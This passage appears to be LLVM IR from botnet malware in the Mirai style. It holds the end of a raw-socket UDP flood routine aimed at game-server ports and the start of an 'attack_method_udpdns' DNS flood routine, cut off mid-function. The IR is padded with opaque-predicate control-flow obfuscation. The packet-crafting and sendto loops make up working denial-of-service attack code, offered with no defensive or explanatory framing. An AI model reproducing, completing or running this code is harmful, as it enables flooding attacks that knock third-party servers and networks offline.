  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %400

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %400

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %160, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %163

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = and i8 %93, 15
  %95 = or i8 %94, 64
  store i8 %95, i8* %92, align 4
  %96 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %97 = bitcast %struct.iphdr* %96 to i8*
  %98 = load i8, i8* %97, align 4
  %99 = and i8 %98, -16
  %100 = or i8 %99, 5
  store i8 %100, i8* %97, align 4
  %101 = load i8, i8* %12, align 1
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i32 0, i32 1
  store i8 %101, i8* %103, align 1
  %104 = load i32, i32* %19, align 4
  %105 = sext i32 %104 to i64
  %106 = add i64 32, %105
  %107 = trunc i64 %106 to i16
  %108 = call zeroext i16 @htons(i16 zeroext %107) #7
  %109 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %110 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %109, i32 0, i32 2
  store i16 %108, i16* %110, align 2
  %111 = load i16, i16* %13, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %111) #7
  %113 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 3
  store i16 %112, i16* %114, align 4
  %115 = load i8, i8* %14, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 5
  store i8 %115, i8* %117, align 4
  %118 = load i8, i8* %15, align 1
  %119 = icmp ne i8 %118, 0
  br i1 %119, label %120, label %124

; <label>:120:                                    ; preds = %73
  %121 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %122 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 4
  store i16 %121, i16* %123, align 2
  br label %124

; <label>:124:                                    ; preds = %120, %73
  %125 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 6
  store i8 17, i8* %126, align 1
  %127 = load i32, i32* @LOCAL_ADDR, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 8
  store i32 %127, i32* %129, align 4
  %130 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %131 = load i32, i32* %9, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i64 %132
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i32 0, i32 1
  %135 = load i32, i32* %134, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 9
  store i32 %135, i32* %137, align 4
  %138 = load i16, i16* %16, align 2
  %139 = call zeroext i16 @htons(i16 zeroext %138) #7
  %140 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %141 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %140, i32 0, i32 0
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %17, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 1
  store i16 %143, i16* %145, align 2
  %146 = load i32, i32* %19, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 12, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %152 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i8*, i8** %22, align 8
  %154 = bitcast i8* %153 to i32*
  store i32 -1, i32* %154, align 4
  %155 = load i8*, i8** %22, align 8
  %156 = getelementptr inbounds i8, i8* %155, i64 4
  store i8* %156, i8** %22, align 8
  %157 = load i8*, i8** %22, align 8
  %158 = load i8*, i8** %18, align 8
  %159 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %157, i8* %158, i32 %159)
  br label %160

; <label>:160:                                    ; preds = %124
  %161 = load i32, i32* %9, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %9, align 4
  br label %68

; <label>:163:                                    ; preds = %68
  %164 = load i32, i32* @x.35
  %165 = load i32, i32* @y.36
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %163
  %172 = load i32, i32* @x.35
  %173 = load i32, i32* @y.36
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %180

; <label>:180:                                    ; preds = %originalBBpart236, %originalBBpart2
  %181 = load i32, i32* @x.35
  %182 = load i32, i32* @y.36
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %180
  store i32 0, i32* %9, align 4
  %189 = load i32, i32* @x.35
  %190 = load i32, i32* @y.36
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %197

; <label>:197:                                    ; preds = %originalBBpart232, %originalBBpart24
  %198 = load i32, i32* %9, align 4
  %199 = load i8, i8* %5, align 1
  %200 = zext i8 %199 to i32
  %201 = icmp slt i32 %198, %200
  br i1 %201, label %202, label %383

; <label>:202:                                    ; preds = %197
  %203 = load i8**, i8*** %11, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds i8*, i8** %203, i64 %205
  %207 = load i8*, i8** %206, align 8
  store i8* %207, i8** %23, align 8
  %208 = load i8*, i8** %23, align 8
  %209 = bitcast i8* %208 to %struct.iphdr*
  store %struct.iphdr* %209, %struct.iphdr** %24, align 8
  %210 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i64 1
  %212 = bitcast %struct.iphdr* %211 to %struct.udphdr*
  store %struct.udphdr* %212, %struct.udphdr** %25, align 8
  %213 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %214 = load i32, i32* %9, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i64 %215
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i32 0, i32 2
  %218 = load i8, i8* %217, align 4
  %219 = zext i8 %218 to i32
  %220 = icmp slt i32 %219, 32
  br i1 %220, label %221, label %242

; <label>:221:                                    ; preds = %202
  %222 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 1
  %227 = load i32, i32* %226, align 4
  %228 = call i32 @ntohl(i32 %227) #7
  %229 = call i32 @rand_next()
  %230 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 2
  %235 = load i8, i8* %234, align 4
  %236 = zext i8 %235 to i32
  %237 = lshr i32 %229, %236
  %238 = add i32 %228, %237
  %239 = call i32 @htonl(i32 %238) #7
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 9
  store i32 %239, i32* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %221, %202
  %243 = load i32, i32* @x.35
  %244 = load i32, i32* @y.36
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %242
  %251 = load i16, i16* %13, align 2
  %252 = zext i16 %251 to i32
  %253 = icmp eq i32 %252, 65535
  %254 = load i32, i32* @x.35
  %255 = load i32, i32* @y.36
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %253, label %262, label %283

; <label>:262:                                    ; preds = %originalBBpart28
  %263 = load i32, i32* @x.35
  %264 = load i32, i32* @y.36
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %262
  %271 = call i32 @rand_next()
  %272 = trunc i32 %271 to i16
  %273 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 3
  store i16 %272, i16* %274, align 4
  %275 = load i32, i32* @x.35
  %276 = load i32, i32* @y.36
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %283

; <label>:283:                                    ; preds = %originalBBpart212, %originalBBpart28
  %284 = load i16, i16* %16, align 2
  %285 = zext i16 %284 to i32
  %286 = icmp eq i32 %285, 65535
  br i1 %286, label %287, label %308

; <label>:287:                                    ; preds = %283
  %288 = load i32, i32* @x.35
  %289 = load i32, i32* @y.36
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %287
  %296 = call i32 @rand_next()
  %297 = trunc i32 %296 to i16
  %298 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 0
  store i16 %297, i16* %299, align 2
  %300 = load i32, i32* @x.35
  %301 = load i32, i32* @y.36
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %308

; <label>:308:                                    ; preds = %originalBBpart216, %283
  %309 = load i16, i16* %17, align 2
  %310 = zext i16 %309 to i32
  %311 = icmp eq i32 %310, 65535
  br i1 %311, label %312, label %317

; <label>:312:                                    ; preds = %308
  %313 = call i32 @rand_next()
  %314 = trunc i32 %313 to i16
  %315 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %316 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %315, i32 0, i32 1
  store i16 %314, i16* %316, align 2
  br label %317

; <label>:317:                                    ; preds = %312, %308
  %318 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 7
  store i16 0, i16* %319, align 2
  %320 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %321 = bitcast %struct.iphdr* %320 to i16*
  %322 = call zeroext i16 @checksum_generic(i16* %321, i32 20)
  %323 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 7
  store i16 %322, i16* %324, align 2
  %325 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %326 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %325, i32 0, i32 3
  store i16 0, i16* %326, align 2
  %327 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %328 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %329 = bitcast %struct.udphdr* %328 to i8*
  %330 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 2
  %332 = load i16, i16* %331, align 2
  %333 = load i32, i32* %19, align 4
  %334 = sext i32 %333 to i64
  %335 = add i64 12, %334
  %336 = trunc i64 %335 to i32
  %337 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %327, i8* %329, i16 zeroext %332, i32 %336)
  %338 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i32 0, i32 3
  store i16 %337, i16* %339, align 2
  %340 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 1
  %342 = load i16, i16* %341, align 2
  %343 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %343, i64 %345
  %347 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %346, i32 0, i32 0
  %348 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %347, i32 0, i32 1
  store i16 %342, i16* %348, align 2
  %349 = load i32, i32* %10, align 4
  %350 = load i8*, i8** %23, align 8
  %351 = load i32, i32* %19, align 4
  %352 = sext i32 %351 to i64
  %353 = add i64 32, %352
  %354 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %355 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %356 = load i32, i32* %9, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %355, i64 %357
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i32 0, i32 0
  %360 = bitcast %struct.sockaddr_in* %359 to %struct.sockaddr*
  store %struct.sockaddr* %360, %struct.sockaddr** %354, align 8
  %361 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %362 = load %struct.sockaddr*, %struct.sockaddr** %361, align 8
  %363 = call i64 @sendto(i32 %349, i8* %350, i64 %353, i32 16384, %struct.sockaddr* %362, i32 16)
  br label %364

; <label>:364:                                    ; preds = %317
  %365 = load i32, i32* @x.35
  %366 = load i32, i32* @y.36
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %364
  %373 = load i32, i32* %9, align 4
  %374 = add nsw i32 %373, 1
  store i32 %374, i32* %9, align 4
  %375 = load i32, i32* @x.35
  %376 = load i32, i32* @y.36
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart232, label %originalBB18alteredBB

originalBBpart232:                                ; preds = %originalBB18
  br label %197

; <label>:383:                                    ; preds = %197
  %384 = load i32, i32* @x.35
  %385 = load i32, i32* @y.36
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %383
  %392 = load i32, i32* @x.35
  %393 = load i32, i32* @y.36
  %394 = sub i32 %392, 1
  %395 = mul i32 %392, %394
  %396 = urem i32 %395, 2
  %397 = icmp eq i32 %396, 0
  %398 = icmp slt i32 %393, 10
  %399 = or i1 %397, %398
  br i1 %399, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %180

; <label>:400:                                    ; preds = %64, %58
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %163
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %180
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %242
  %401 = load i16, i16* %13, align 2
  %402 = zext i16 %401 to i32
  %403 = icmp eq i32 %402, 65535
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %262
  %404 = call i32 @rand_next()
  %405 = trunc i32 %404 to i16
  %406 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 3
  store i16 %405, i16* %407, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %287
  %408 = call i32 @rand_next()
  %409 = trunc i32 %408 to i16
  %410 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %411 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %410, i32 0, i32 0
  store i16 %409, i16* %411, align 2
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %364
  %412 = load i32, i32* %9, align 4
  %_ = sub i32 %412, 1
  %gen = mul i32 %_, 1
  %_19 = shl i32 %412, 1
  %_20 = shl i32 %412, 1
  %_21 = sub i32 %412, 1
  %gen22 = mul i32 %_21, 1
  %_23 = shl i32 %412, 1
  %_24 = sub i32 0, %412
  %gen25 = add i32 %_24, 1
  %_26 = shl i32 %412, 1
  %_27 = sub i32 %412, 1
  %gen28 = mul i32 %_27, 1
  %_29 = sub i32 0, %412
  %gen30 = add i32 %_29, 1
  %413 = add nsw i32 %412, 1
  store i32 %413, i32* %9, align 4
  br label %originalBB18

originalBB34alteredBB:                            ; preds = %originalBB34, %383
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %97

; <label>:80:                                     ; preds = %4
  %81 = load i32, i32* @x.37
  %82 = load i32, i32* @y.38
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %80
  %89 = load i32, i32* @x.37
  %90 = load i32, i32* @y.38
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %604

; <label>:97:                                     ; preds = %4
  %98 = load i8*, i8** %20, align 8
  %99 = call i32 @util_strlen(i8* %98)
  store i32 %99, i32* %21, align 4
  %100 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %100, i32* %10, align 4
  %101 = icmp eq i32 %100, -1
  br i1 %101, label %102, label %103

; <label>:102:                                    ; preds = %97
  br label %604

; <label>:103:                                    ; preds = %97
  store i32 1, i32* %9, align 4
  %104 = load i32, i32* %10, align 4
  %105 = bitcast i32* %9 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %127

; <label>:108:                                    ; preds = %103
  %109 = load i32, i32* @x.37
  %110 = load i32, i32* @y.38
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %108
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  %119 = load i32, i32* @x.37
  %120 = load i32, i32* @y.38
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %604

; <label>:127:                                    ; preds = %103
  %128 = load i32, i32* @x.37
  %129 = load i32, i32* @y.38
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %127
  store i32 0, i32* %9, align 4
  %136 = load i32, i32* @x.37
  %137 = load i32, i32* @y.38
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
